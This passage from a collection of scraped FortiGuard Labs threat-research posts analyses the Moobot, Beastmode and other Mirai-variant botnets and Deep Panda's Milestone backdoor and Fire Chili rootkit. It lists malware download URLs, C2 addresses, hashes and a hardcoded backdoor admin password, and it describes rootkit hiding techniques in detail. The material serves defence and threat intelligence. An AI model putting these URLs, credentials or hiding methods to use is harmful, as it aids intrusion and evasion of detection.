right before this blog was published, our monitoring system encountered yet another updated variant that we are currently investigating. FortiGuard Labs will continue monitoring this campaign and provide updates as necessary. IOCs Download URLs http[:]//194.85.248.176/bins/eh.x86 http[:]//194.85.248.176/bins/eh.mips http[:]//194.85.248.176/bins/eh.mpsl http[:]//194.85.248.176/bins/eh.arm4 http[:]//194.85.248.176/bins/eh.arm5 http[:]//194.85.248.176/bins/eh.arm6 http[:]//194.85.248.176/bins/eh.arm7 http[:]//194.85.248.176/bins/eh.ppc http[:]//194.85.248.176/bins/eh.m68k http[:]//194.85.248.176/bins/eh.sh4 http[:]//194.85.248.176/bins/eh.86_64 http[:]//194.85.248.176/local.sh http[:]//194.85.248.176/tshit.sh http[:]//2.56.59.215/apache2.sh http[:]//212.192.241.72/lolol.sh Samples (SHA256) ebfc95372427f8b845daff9ff4aebe2451fa78e35a24edd084685f06ba3daee4 57f50f34e6df8ee9006e46b5fe5c4ee11febe9e33b087c809f1384563e9f1d4e 8ebef715ddb0b4e973b2f8c7529f4480b5caa9c4a25f8fd05a7eaacf036cca20 113be1f9db8af2469b82ce1b5d1b0c61c50586567b3898f2b8a614cd6e8f47a8 b4c3c79d148db638f891143a1910c3d17f973c512a719b1f7525a823b14d29a8 d3928d0b6dedce6a083123028e50ba76e1b29666e70a96eec1a7061b7303bf1a 6b463e9f5d9e8edbc235bceb854367b26ed6effb0dee9881a4f4e88a967318d5 d88052c0a76cac7e571870a4e87c5354594c26b4955cd934870dc12d48f129d5 265396023cbbad6b3480b851873ece9fa2f32c63739a7a0ac32d196843080cc8 83566400bdb09c5e2438c0d9ff723c88328ca93f29e648f97088342e239bfa09 af9ac01e9e8cf7064d590044df43adca566521d223662cf5e0e2500badff6998 de01f26209a085eeff8c217782d283640a6226ccf1bd27eefd696658b55d10ba a4b16a5bf9b6e662050a3c5ff157d7b2f0be301a1f8f5d1359170132b8b22e58 7a47e5b83e3c42df2ab72adf4a041b2e382f61a0ff378f593156353a78c2c702 1bd895ed050ce42d0f39b6baa0b6a454e05eb5bff72290857cb8fb77a9e4b4b9 71ca57bbba49aa877f7ded340328342c6e82e3a99720734c8b0de150d44d906c 23b03aa7d1dadd2e71016702f3e1b278b3a2c4f0c7d0cdc272774a428b88d09c fb7b03e7619d3ac5c4cbadc6b38841b11e3b19214b776073a590b571f91fe51e 3c978e02d21c7c12631d56c41aceb305fc11348a53eed47e29f7ce62ea0da4df 4832cff5666433a784d6ba48a0e400367d25314ef15d08a216b6286226eff342 95e4ac3ae03646cda56d80df80d775ed4bf23f98be42274fb440e7bc0d03ce88 8d390ad5af8d70692bda123b96e9745816ec7893d84682adb6d243619538b9d3 66adea50e0de8e1d664bb18c9f80596d1443b90e9ba57a59425720886a0c97e0 a87b502575d0db1b6257f1cf75edf4894bc84598f79148525b5cc449d143a495 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability": {
                "metadata": {
                    "dateAccessed": "2022-01-06",
                    "dateCreated": "2021-12-06",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms : Hikvision Product Impact parties : IP Cam/NVR Impact : Attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands in the web server Severity : Critical Last September 18th, a threat researcher released a write-up about a remote code execution vulnerability that affects various products from Hikvision, one of the largest video surveillance brands in the world. Hikvision is a CVE CNA and quickly assigned the CVE number, CVE-2021-36260 and released a patch for the vulnerability on the same day as the threat researcher’s disclosure. Shortly after, FortiGuard Labs developed an IPS signature to address it. During our analysis, we observed numerous payloads attempting to leverage this vulnerability to probing the status of devices or extracting sensitive data from victims. One payload in particular caught our attention. It tries to drop a downloader that exhibits infection behavior and that also executes Moobot, which is a DDoS botnet based on Mirai. In this blog we explain how an attacker delivers this payload through the Hikvision vulnerability, along with details of the botnet. Stage 0 – Exploitation and Propagation CVE-2021-36260 results from insufficient input validation, allowing unauthenticated users to inject malicious content into a <language> tag to trigger a command injection attack on a Hikvision product. Below is an example of a request leveraging this exploit: We collected a number of payloads leveraging this vulnerability, and eventually found a downloader. After tracing the traffic capture, the complete payload is shown in the following  figure: First, because the final Moobot will be saved as “macHelper,” it first tries to remove any file already named “macHelper.” It then echoes code into “downloader,” which is a small ELF 32-bit LSB ARM file. After downloader completes downloading, it executes Moobot with the parameter “hikivision”. Finally, it changes commonly used commands, such as “reboot,” to prevent an administrator from invoking reboot on the affected device. Stage 1 - Downloader The attacker leverages this vulnerability to drop a downloader (SHA256: 1DCE6F3BA4A8D355DF21A17584C514697EE0C37B51AB5657BC5B3A297B65955F). It has only one job: download the main botnet. It downloads the malware with “/arm5” URI form server 199.195.250[.]233:80 and prints “RAY” if the downloading process was successful. The following image shows the disassembled code: From the IP address we not only get the moobot variants for different architectures, we also get the historic malware from directory “/h/“. Stage 2 - Moobot Based on our analysis, the malware (SHA256: 38414BB5850A7076F4B33BF81BAC9DB0376A4DF188355FAC39D80193D7C7F557) downloaded in the previous stage is Moobot, which is Mirai-based. Its most obvious feature is that it contains the data string “w5q6he3dbrsgmclkiu4to18npavj702f”, which is used in the “rand_alphastr” function. It is used to create random alphanumeric strings with different purposes, such as for a setup process name or to generate data for attacking. It also has some elements from Satori, which is another Mirai variant botnet. It contains a “ downloader” that targets a victim’s IoT devices, and it prints a “9xsspnvgc8aj5pi7m28p” string after execution. This variant also forks itself with the process name “/usr/sbin*” to try to look like a normal process while wiping out the original file, “macHelper”. Since it is based on Mirai, the botnet also contains a data section to store its configuration. The plaintext configuration can be decoded after XOR with 0x22: After getting the C2 server (life.zerobytes[.]cc) from its configuration, it starts sending heartbeat (\\x00\\x00) packets and then waits for the next control command from the C2 server. Once the victim system receives the command, it starts a DDoS attack to a specific IP address and port number. One example of the DDoS attack traffic is shown below: The DDoS attack command is 24 bytes and can be seen in the Data section in Figure 8. This detail is illustrated in the following figure, which includes the flood method and the target IP/Port. Except for SYN flood, the C2 server has other attacking commands, such as 0x06 for UDP flood, 0x04 for ACK flood, and 0x05 for ACK+PUSH flood. The complete attack scenario from trying to infect Hikvision product to deploying Moobot is shown in figure 10: We also noticed that a DDoS service provider based the packet capture from our machine in Figure 11. We tracked down a telegram channel named “tianrian,” which provides a DDoS service. They use a specific string, “openmeokbye”, in their login interface, shown in Figure 12. This channel was created on June 11, 2021, and started its service in August. From the chatting channel we can see that the service is still updating. Users should always look out for DDoS attacks and apply patches to vulnerable devices. Conclusion Hikvision is one the biggest provider of IP cam/NVR products in the global market. CVE-2021-36260 is a critical vulnerability that makes Hikvision products a target for Moobot. In this blog we showed how an attacker can leverage CVE-2021-36260 and elaborated in detail each stage of the process. Although a patch has been released to address this vulnerability, this IoT botnet will never stop looking for a vulnerable end point. Because of this, users should upgrade affected devices immediately as well as apply FortiGuard protection. Fortinet Protections Fortinet released IPS signature Hikvision.Product.SDK.WebLanguage.Tag.Command.Injection for CVE-2021-36260 to proactively protect our customers. The signature is officially released in IPS definition version 18.192. The downloader and all related malware from that site are detected and blocked by FortiGuard AntiVirus: ELF/Mirai.AE!tr ELF/Mirai.BO!tr ELF/Mirai.D!tr ELF/Mirai.AYU!tr ELF/Mirai.WJ!tr Linux/Mirai.WJ!tr Both the downloading URL and C2 server have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service. IOCs SHA256: 1DCE6F3BA4A8D355DF21A17584C514697EE0C37B51AB5657BC5B3A297B65955F 38414BB5850A7076F4B33BF81BAC9DB0376A4DF188355FAC39D80193D7C7F557 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/totolink-vulnerabilities-beastmode-mirai-campaign": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-04-01",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Research Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level: Critical Between February and March 2022, our FortiGuard Labs team observed that the Beastmode (aka B3astmode) Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Five new exploits were added within a month, with three targeting various models of TOTOLINK routers. This inclusion of TOTOLINK exploits is especially noteworthy as they were added just a week after the exploit codes were published on GitHub. We previously reported on the MANGA campaign , which similarly adopted exploit code within weeks of their release. By rapidly adopting newly released exploit code, threat actors can potentially infect vulnerable devices and expand their botnets before patches are applied to fix these vulnerabilities. TOTOLINK has already released updated firmware for affected models and users are strongly encouraged to update their devices. This post details how this threat leverages these vulnerabilities to control affected devices, and ways to protect users from these attacks. Exploiting New Vulnerabilities The Beastmode campaign derives its name from filenames and URLs used for its binary samples (Figure 1), as well as a unique HTTP User-Agent header \"b3astmode\" (Figure 2) within the exploit requests. Binary samples are based on the publicly available source code of the Mirai botnet. Like most DDOS botnets, aside from brute-forcing credentials, Beastmode employs a variety of exploits to infect more devices, as listed below. CVE-2022-26210 targets TOTOLINK A800R, A810R, A830R, A950RG, A3000RU, and A3100R (Figure 2). CVE-2022-26186 targets TOTOLINK N600R and A7100RU (Figure 3). CVE-2022-25075 / 25076 / 25077 / 25078 / 25079 / 25080 / 25081 / 25082 / 25083 / 25084 are a family of similar vulnerabilities targeting TOTOLINK A810R, A830R, A860R, A950RG, A3100R, A3600R, T6, and T10 routers. (Figure 4). Interestingly, the samples caught on 20 Feb 2022 contained a typo in the URL, where “downloadFile.cgi” was used instead of “downloadFlile.cgi” used by the devices. This had been fixed in samples captured three days later, suggesting active development and operation of this campaign. Apart from TOTOLINK products, this campaign also targets discontinued D-Link products (DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L and DIR-836L) via CVE-2021-45382 (Figure 5). Note that updated firmware is not available as these products have reached their end of life/support cycles. It is interesting to note that this campaign also attempts to exploit CVE-2021-4045 (Figure 6), a vulnerability for the TP-Link Tapo C200 IP camera, which we have not observed in other Mirai-based campaigns. While the current implementation of the exploit is incorrect, device owners should still update their camera firmware to fix this vulnerability. A couple of older vulnerabilities were also found in the samples analyzed by FortiGuard Labs researchers, namely CVE-2017-17215 (Figure 7) targeting Huawei HG532 routers, and CVE-2016-5674 (Figure 8) targeting NUUO NVRmini2, NVRsolo, Crystal Devices, and NETGEAR ReadyNAS Surveillance products. While affecting a variety of products, these vulnerabilities are all similar in that they allow threat actors to inject commands to be executed after successful exploitation. This usually involves using the wget command to download shell scripts to infect the device with Beastmode. In addition, exploits lead to slightly different shell scripts. Snippets of the scripts downloaded from the successful exploitation of CVE-2021-45382, CVE-2022-26186, and CVE-2022-25075, respectively are shown below (Figure 9). As shown in the above figure, each script downloads the same file to different filenames but is executed with different parameters. For instance, successful exploitation of CVE-2021-45382, a vulnerability involving a function named “DDNS” within D-Link router firmware, leads to the download and execution (Figure 5) of the shell script “ddns.sh”. Then, as shown in Figure 9, the script then downloads the Beastmode binary, which is saved as “ddns” and executed with the “ddns.exploit” parameter. The parameter (highlighted in blue) allows the infected device to register itself as part of the “ddns.exploit” sub-group within the botnet. It could then be used by the botnet operators to assess the viability of specific exploits by measuring the number of bots or simply for ease of management. Once devices are infected by Beastmode, the botnet can be used by its operators to perform a variety of DDoS attacks commonly found in other Mirai-based botnets, including: attack_app_http attack_tcp_ack attack_tcp_syn attack_udp_plain attack_udp_vse attack_udp_ovhhex attack_udp_stdhex attack_udp_CLAMP Conclusion Even though the original Mirai author was arrested in fall 2018, this article highlights how threat actors, such as those behind the Beastmode campaign, continue to rapidly incorporate newly published exploit code to infect unpatched devices using the Mirai malware. By continuously monitoring the evolving threat landscape, FortiGuard Labs researchers identify new vulnerabilities exploited by Mirai variants and malware targeting IoT devices to bring greater awareness to such threats and better secure our customers’ networks. Fortinet Protections Fortinet customers are protected by the following: The following generic FortiGuard IPS signatures detect exploitation attempts from Beastmode and other Mirai-based botnets: Mirai.Botnet HTTP.Unix.Shell.IFS.Remote.Code.Execution FortiGuard Labs also provides IPS signatures against the following vulnerabilities. CVE-2017-17215 - Huawei.HG532.Remote.Code.Execution CVE-2016-5674 - NUUO.Surveillance.Application.UNAUTH.Remote.Code.Execution The FortiGuard Web Filtering Service blocks downloaded URLs and identified C2s. The FortiGuard AntiVirus service detects and blocks this threat as Linux/Mirai and ELF/Mirai FortiGuard IP Reputation & Anti-Botnet Security Service proactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. IOCs Download URLs http://195.133.18[.]119/beastmode/b3astmode.86_64 http://195.133.18[.]119/beastmode/b3astmode.arm4 http://195.133.18[.]119/beastmode/b3astmode.arm5 http://195.133.18[.]119/beastmode/b3astmode.arm6 http://195.133.18[.]119/beastmode/b3astmode.arm7 http://195.133.18[.]119/beastmode/b3astmode.m68k http://195.133.18[.]119/beastmode/b3astmode.mips http://195.133.18[.]119/beastmode/b3astmode.mpsl http://195.133.18[.]119/beastmode/b3astmode.ppc http://195.133.18[.]119/beastmode/b3astmode.sh4 http://195.133.18[.]119/beastmode/b3astmode.x86 C2 IPs 195.133.18[.]119 136.144.41[.]69 Samples (SHA256) 04a50c409a30cdd53036c490534ee7859b828f2b9a9dd779c6b0112b88b74708 0ca74024f5b389fcfa5ee545c8a7842316c78fc53d4a9e94c34d556459a58877 0d442f4327ddd254dbb2a9a243d9317313e44d4f6a6078ea1139ddd945c3f272 14726d501dd489e8228af9580b4369819efb3101f6128df1a1ab0fcc8d96e797 18cefe4333f5f1165c1275c956c8ae717d53818b2c5b2372144fb87d6687f0d8 36a85f2704f77d7e11976541f3d77774109461e1baae984beb83064c2e34239a 3d0a119b68044b841128e451d80ee41d8be9cc61f9ff9a01c3db7d3271e15655 5adfd18422a37a40e6c7626b27d425a4c5a6ca45ecbc8becd690b8533d9d6c7c 635569c7612278d730cb87879843de03d1ea0df4e1c70262ab50659780eace3b 676b2aa6839606d49bbd2f29487e4c218e7d14dd1a9b870edcabdd11fcab9cf7 9c88fa218af7fb72188a0262b3a29008fedcf3d434b90e8fa578ac8f250f5025 a21aa45045c0d4b0d785891b8be57496d62bc2396d01c24a34b40f3e2227ef07 a5cbe89bf1f3121eb2012e3c5bb5c237c613b8b615384be0f1cc92817a2f1efe a6a7e46bd0e9ec67a1adec64af8fddee18ce019f731ee9cbf8341b35b2519dd9 b573f4d58b1fe6309b90611dd1d1030d7a3d1eb8ddb18de6dc58eefa876820fd be3248d97653e8f97cb8f69af260f03b19965489478211a5565b786e9f5d3c02 ca8980cb3bd286e41950d78555fd070eaf2d3bebf2751cb0d12a3eff0a41f829 cd48523a6dced4054cce051d4dd8c06268cee375e56afbf59d724faa91c3e766 d799ae8a017e76d22f1f35f271ebae9168b7712dce0ce86753edabd6e5f4f0d6 ded30dbc39e310ebbc17a9667a14e7f0f2e08999bfc5ebd4eae5c1840b82860a e7db388460d4e1f8d740018e6012af0ad785d3876a35c924db1f4982d7902db3 e85c3d3ed49d44b1ec3af89d730e129d68a32212e911e6431f405e201597f6ed Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/deep-panda-log4shell-fire-chili-rootkits": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-30",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Research Affected Platforms: Windows Impacted Users: Windows Users Impact: Collects sensitive information from victim machines Severity Level: Critical During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group. The group exploited the infamous Log4Shell vulnerability in VMware Horizon servers. The nature of targeting was opportunistic insofar that multiple infections in several countries and various sectors occurred on the same dates. The victims belong to the financial, academic, cosmetics, and travel industries. Following exploitation, Deep Panda deployed a backdoor on the infected machines. Following forensic leads from the backdoor led us to discover a novel kernel rootkit signed with a stolen digital certificate. We found that the same certificate was also used by another Chinese APT group, named Winnti, to sign some of their tools. In this blog, we share our analysis of the flow of infection, the backdoor, and new rootkit, along with our attribution of this campaign to these Chinese nation-state threat actors. Chain of Attack While examining customer alerts and telemetry, we noticed several infiltrations into victim networks that were achieved via a Log4Shell exploitation of vulnerable VMware Horizon servers. These attacks spawned a new PowerShell process to download and execute a chain of scripts that ended with the installation of a malicious DLL. The encoded PowerShell command downloads another PowerShell script from a remote server and executes it. The next stage PowerShell script downloads three additional files from the same server: 1.bat , syn.exe and 1.dll . The script then executes 1.bat , which in turn executes syn.exe and proceeds to delete all three files from the disk. syn.exe is a program that loads its first command-line argument using LoadLibrary , in this case, 1.dll . The 1.dll module is the final payload, a backdoor that we have dubbed Milestone. Its code is based on the leaked source code of Gh0st RAT /Netbot Attacker and is packed with Themida. The backdoor copies itself to %APPDATA%\\newdev.dll and creates a service named msupdate2 by creating the service entry directly in the registry. Several other service names and descriptions have been observed among different samples. While it has the same name as the legitimate Microsoft newdev.dll , it has only two of the real newdev.dll's exports plus an additional ServiceMain export. Overall, the backdoor has capabilities similar to Gh0st RAT’s, with notable differences. Its C2 communication is uncompressed, unlike Gh0st RAT communication which is zlib-compressed. There are differences in commands as well. For example, in the CMD command, some variants first copy cmd.exe to dllhost.exe to avoid detection by security products that monitor CMD executions. Additionally, the backdoor supports a command that sends information about the current sessions on the system to the server. This command does not exist in the original Gh0st RAT source code. Among the many backdoor samples we hunted down, there are two distinguishable versions: binaries compiled in 2016 contain the version string MileStone2016 , while those compiled in 2017 contain MileStone2017 . The samples used in the recent infections we detected are only the 2017 variants. There are several differences between the 2016 and 2017 Milestones. First, 2017 Milestones are typically packed with Themida, while 2016 ones are unpacked. Secondly, although 2016 Milestones have plausible timestamps, all 2017 Milestones share an identical timestamp, which leads us to believe they are forged. Combined with the fact that 2017 backdoors are used in attacks to this day, it is uncertain whether they were compiled in 2017 or much later. The two versions also slightly differ in commands and communication. 2016 Milestones apply XOR encryption to their communication, as well as support a command to execute as a new user with administrator privileges. To do so, the backdoor first creates a new administrator user on the system, with the username ANONYMOUS and the password MileSt0ne2@16 . It then executes another instance of itself as that user with CreateProcessAsUser and proceeds to remove the user from the system immediately thereafter. A Stone’s Throw Away In addition to the backdoors, we obtained a third type of sample – a dropper. It writes three files to the disk: Benign executable – %APPDATA%\\syn.exe Milestone loader – %APPDATA%\\newdev.dll Driver – C:\\Windows\\system32\\drivers\\crtsys.sys The payloads above are stored XOR-encrypted and LZMA-compressed. The XOR key is a hardcoded DWORD that changes between samples. The dropper carries two builds of the driver for 32-bit and 64-bit systems. Using the Service Control Manager (SCM) API, it installs the build compliant with the operating system architecture as a driver named FSFilter-Min . The dropper patches the .data section of the loader binary to add its configuration before it writes it to disk. Next, the dropper executes syn.exe , a benign executable signed by Synaptics, in order to side-load the newdev.dll loader module. The loader also contains a XOR-encrypted and LZMA-compressed payload, which is a Milestone backdoor. It decrypts the configuration with XOR 0xCC ​​​​​​​ and, like the dropper, patches the backdoor’s .data section with it. The configuration contains the backdoor’s version, C2 server address and service parameters. Finally, the loader reflectively loads the Milestone backdoor and calls its exports. Fire Chili Rootkit As part of our research, we have collected four driver samples — two pairs of 32-bit and 64-bit samples. One pair was compiled in early August 2017 and the second pair was compiled ten days later. All four driver samples are digitally signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 433CCR Company (433씨씨알 주식회사). The signatures made with Frostburn Studios’ certificate are even timestamped. Two of the samples are on VirusTotal and have a very low detection rate. The rootkit starts by ensuring the victim machine is not running in safe mode. It then checks the operating system version. The rootkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations. For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash. In general, the latest supported build is Windows 10 Creators Update (Redstone 2), released in April 2017. The purpose of the driver is to hide and protect malicious artifacts from user-mode components. This includes four aspects: files, processes, registry keys and network connections. The driver has four global lists, one for each aspect, that contain the artifacts to hide. The driver’s IOCTLs allow dynamic configuration of the lists through its control device \\Device\\crtsys . As such, the dropper uses these IOCTLs to hide the driver’s registry key, the loader and backdoor files, and the loader process. Files The rootkit implements a filesystem minifilter using code based on Microsoft’s official driver code samples. Prior to registering the minifilter instance, it dynamically creates an instance in the registry named Sfdev32TopInstance with altitude 483601 . The rootkit sets only one callback for a postoperation routine for IRP_MJ_DIRECTORY_CONTROL . When it receives an IRP with a minor function of IRP_MN_QUERY_DIRECTORY and a filename from the global file list, the callback changes the filename to “.” and the filename length to 0 (in the FILE_BOTH_DIR_INFORMATION structure). The global file list is initialized with the path of the driver by default ( *\\SYSTEM32\\DRIVERS\\CRTSYS.SYS ). Processes There are two mechanisms pertaining to processes: Preventing process termination. Hiding a process. To prevent the termination of a process, the rootkit denies the PROCESS_TERMINATE access right of the processes it protects. Using ObRegisterCallbacks , it registers a preoperation callback routine that triggers whenever a handle to a process or thread is created or duplicated in the system. When the handle access originates from user-mode and the image path or PID of the handle target are in the global process list, the driver removes the PROCESS_TERMINATE permission from the DesiredAccess parameter. This results in restricting user-mode processes from acquiring the permissions needed to terminate the threat actor’s malicious processes using standard APIs. To hide a process, the rootkit monitors all newly created processes on the system by registering a callback using the PsSetCreateProcessNotifyRoutine API. Whenever a new process is created on the system, the rootkit checks if its path is in the global process list. If so, the process is removed from the ActiveProcessLinks list of the EPROCESS structure, which is a circular doubly-linked list of all running processes on the system. The driver removes the process’s list entry from ActiveProcessLinks ​​​​​​​by linking its Flink (the next entry) to its Blink (the previous entry). As a result, the process is hidden from utilities such as Task Manager. Since the EPROCESS structure changes between Windows builds, the rootkit resolves the ActiveProcessLinks offset dynamically during runtime. It traverses the process’s EPROCESS ​​​​​​​structure, comparing each member to its PID, to locate the offset of the UniqueProcessId field. When found, the ActiveProcessLinks offset is also easily located as it is the next field in the EPROCESS structure. The older rootkit samples use the hiding mechanism on Windows 8 and below, while the newer samples use it on only Windows 7 and below. By default, the global process list is initialized with the path *\\qwerty.exe . However, we have not observed any file with this name related to the campaign. Registry Keys The rootkit hides registry keys from users using Microsoft’s Registry Editor. The code is based on an open-source project published by a Chinese developer. The HHIVE->GetCellRoutine functions of keys in the global registry keys list are replaced with a filter function. When the path of the querying process is *\\WINDOWS\\REGEDIT.EXE , the function simply returns 0 in place of the key node. By default, the global registry list is initialized with the rootkit’s registry key ( \\REGISTRY\\MACHINE\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\CRTSYS ) . Network Connections The rootkit is capable of hiding TCP connections from tools such as netstat. Much of the code for this part seems to be copied from an open-source project . The rootkit attaches to nsiproxy.sys ’s device stack and intercepts IOCTLs of type IOCTL_NSI_GETALLPARAM ( 0x12000B ) that are sent to it. This IOCTL is used to retrieve information about the active network connections on the system. When it is intercepted, the driver replaces the IoCompletion routine with a function that filters the results to hide its own network connections. IOCTL_NSI_GETALLPARAM returns the information about network connections in an NSI_PARAM structure. NSI_PARAM contains connection data such as IP, port, connection state, and process IDs of the executables in charge of creating the connection. The filter function iterates this structure, searching for connections involving a process or port number from its global network list. All identified connections are removed from the structure, rendering them hidden from the process that sent the IOCTL. It is interesting to note that the newer build of the 64-bit rootkit added support to filter IOCTLs from 32-bit processes as well. If attaching to nsiproxy.sys fails, the rootkit attaches to \\Device\\Tcp instead, intercepting IOCTL_TCP_QUERY_INFORMATION_EX (0x120003) and hiding network connections in a similar manner. By default, the global network list is initialized with the following process paths: *\\SYN.EXE *\\SVCHOST.EXE As a result, TCP connections of all services running under svchost.exe are hidden, not just the ones of the Milestone backdoor. Attribution The Milestone backdoor is actually the same Infoadmin RAT that was used by Deep Panda back in the early 2010s, referenced in blogs from 2013 and 2015 . Although many backdoors are based on Gh0st RAT code, Milestone and Infoadmin are distinguishable from the rest. Besides having profoundly similar code, both backdoors incorporate identical modifications of Gh0st RAT code not seen in other variants. Both backdoors share a XOR encryption function for encrypting communication and have abandoned the zlib compression of the original Gh0st RAT. Both also modified Gh0st RAT code in an identical way, specifically the CMD and screen capture functions. Moreover, the backdoors share two commands that are not present in other Gh0st RAT variants: the session enumeration command and the command to execute as an administrative user. Additional evidence indicates affiliation to Winnti. The rootkits are digitally signed with certificates stolen from game development companies, which is a known characteristic of Winnti. Searching for more files signed with one of the certificates led to a malicious DLL uploaded to VirusTotal with the name winmm.dll . Further examination revealed it as the same tool referenced in a blog about Winnti that was published in 2013 . Yet another connection to Winnti is based on a C2 domain. Two of the newdev.dll loaders are configured with the server gnisoft[.]com , which was attributed to Winnti in 2020 . Conclusion In this blog, we have attributed a series of opportunistic Log4Shell infections from the past month to Deep Panda. Though previous technical publications on Deep Panda were published more than half a decade ago, this blog also relates to a more recent report about the Milestone backdoor, which shows that their operations have continued throughout all these years. Furthermore, we introduced the previously unknown Fire Chili rootkit and two compromised digital signatures, one of which we also directly linked to Winnti. Although both Deep Panda and Winnti are known to use rootkits as part of their toolset, Fire Chili is a novel strain with a unique code base different from the ones previously affiliated with the groups. The reason these tools are linked to two different groups is unclear at this time. It’s possible that the groups’ developers shared resources, such as stolen certificates and C2 infrastructure, with each other. This may explain why the samples were only signed several hours after being compiled. Fortinet Solutions FortiEDR detects and blocks these threats out-of-the-box without any prior knowledge or special configuration. It does this using its post-execution prevention engine to identify malicious activities: All network IOCs have been added to the FortiGuard WebFiltering blocklist. The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. FortiGuard Antivirus has coverage in place as follows: W32/Themida.ICD!tr BAT/Agent.6057!tr W64/Agent.A10B!tr W32/Agent.0B37!tr W32/GenKryptik.FQLT!tr W32/Generic.AC.F834B!tr W32/GenKryptik.ATCY!tr W32/Generic.AP.33C2D2!tr W32/GenKryptik.AQZZ!tr W32/Generic.HCRGEJT!tr W32/Agent.DKR!tr W32/Agent.QNP!tr W32/Agent.RXT!tr W32/Agentb.BXIQ!tr W32/Agent.DA3E!tr W32/Agent.D584!tr W32/Agent.0F09!tr W32/Agent.3385!tr W64/Agent.D87B!tr.rkit W32/Agent.69C1!tr.rkit In addition, as part of our membership in the Cyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers. Appendix A: MITRE ATT&CK Techniques ID Description T1190 Exploit Public-Facing Application T1569.002 System Services: Service Execution T1059.001 Command and Scripting Interpreter: PowerShell T1027 Obfuscated Files or Information: Software Packing T1041 Exfiltration Over C2 Channel T1082 System Information Discovery T1036 Masquerading T1083 File and Directory Discovery T1059.003 Command and Scripting Interpreter: Windows Command Shell T1592 Gather Victim Host Information T1588.003 Obtain Capabilities: Code Signing Certificates T1014 Rootkit T1574.002 Hijack Execution Flow: DLL Side-Loading T1620 Reflective Code Loading T1113 Screen Capture Appendix B: IOCs IOC Type Details ece45c25d47ba362d542cd0427775e68396bbbd72fef39823826690b82216c69 SHA256 Backdoor 517c1baf108461c975e988f3e89d4e95a92a40bd1268cdac385951af791947ba SHA256 Backdoor a573a413cbb1694d985376788d42ab2b342e6ce94dd1599602b73f5cca695d8f SHA256 Backdoor 9eeec764e77bec58d366c2efc3817ed56371e4b308e94ad04a6d6307f2e12eda SHA256 Backdoor d005a8cf301819a46ecbb1d1e5db0bf87951808d141ada5e13ffc4b68155a112 SHA256 Backdoor 69c69d71a7e334f8ef9d47e7b32d701a0ecd22ce79e0c11dabbc837c9e0fedc2 SHA256 Backdoor dfd2409f2b0f403e82252b48a84ff4d7bc3ebc1392226a9a067adc4791a26ee7 SHA256 Backdoor 07c87d036ab5dca9947c20b7eb7d15c9434bb9f125ac564986b33f6c9204ab47 SHA256 Backdoor c0a2a3708516a321ad2fd68400bef6a3b302af54d6533b5cce6c67b4e13b87d3 SHA256 Backdoor f8b581393849be5fc4cea22a9ab6849295d9230a429822ceb4b8ee12b1d24683 SHA256 Backdoor 14930488158df5fca4cba80b1089f41dc296e19bebf41e2ff6e5b32770ac0f1e SHA256 Backdoor a9fa8e8609872cdcea241e3aab726b02b124c82de4c77ad3c3722d7c6b93b9b5 SHA256 Backdoor e92d4e58dfae7c1aadeef42056d5e2e5002814ee3b9b5ab1a48229bf00f3ade6 SHA256 Backdoor 855449914f8ecd7371bf9e155f9a97969fee0655db5cf9418583e1d98f1adf14 SHA256 Backdoor a5fd7e68970e79f1a5514630928fde1ef9f2da197a12a57049dece9c7451ed7b SHA256 Backdoor f5eb8949e39c8d3d70ff654a004bc8388eb0dd13ccb9d9958fd25aee47c1d3ae SHA256 Backdoor 64255ff02e774588995b203d556c9fa9e2c22a978aec02ff7dea372983b47d38 SHA256 Backdoor b598cb6ba7c99dcf6040f7073fe313e648db9dd2f6e71cba89790cc45c8c9026 SHA256 Backdoor 2d252c51a29f86032421df82524c6161c7a63876c4dc20faffa47929ec8a9d60 SHA256 Backdoor 2de6fb71c1d5ba0cd8d321546c04eaddddbf4a00ce4ef6ca6b7974a2a734a147 SHA256 Backdoor bd5d730bd204abaddc8db55900f307ff62eaf71c0dc30cebad403f7ce2737b5c SHA256 Backdoor 412464b25bf136c3780aff5a5a67d9390a0d6a6f852aea0957263fc41e266c8b SHA256 Backdoor 0d096d983d013897dbe69f3dae54a5f2ada8090b886ab68b74aa18277de03052 SHA256 Backdoor cfba16fa9aa7fdc7b744b2832ef65558d8d9934171f0d6e902e7a423d800b50f SHA256 Backdoor a71b3f06bf87b40b1559fa1d5a8cc3eab4217f317858bce823dd36302412dabc SHA256 Backdoor 235044f58c801955ed496f8c84712fdb353fdd9b6fda91886262234bdb710614 SHA256 Backdoor e1a51320c982179affb26f417fbbba7e259f819a2721ab9eb0f6d665b6ea1625 SHA256 Backdoor d1be98177f8ae2c64659396277e7d5c8b7dba662867697feb35282149e3f3cbb SHA256 Backdoor ab3470a45ec0185ca1f31291f69282c4a188a46e SHA1 Backdoor 